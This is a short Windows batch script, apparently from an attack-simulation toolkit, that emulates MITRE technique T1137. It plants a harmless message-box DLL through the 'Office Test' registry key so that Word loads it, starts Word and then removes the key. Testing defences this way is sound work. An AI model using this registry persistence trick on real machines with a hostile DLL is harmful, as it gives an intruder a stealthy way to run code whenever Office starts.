@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO Technique: Office Application Startup	(T1137)
ECHO.
ECHO [+] Simulate load of arbitrary DLL using Office Test persistence registry entry 
ECHO -------------------------------------------------------------------
copy /Y %utilities%\MessageBox32.dll %appdata%\
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office Test\Special\Perf" /t REG_SZ /d "%appdata%\MessageBox32.dll"
cmd /c start winword.exe
ping 127.0.0.1 -n 4 > nul
reg delete "HKCU\Software\Microsoft\Office test" /f
ping 127.0.0.1 -n 4 > nul
ECHO.
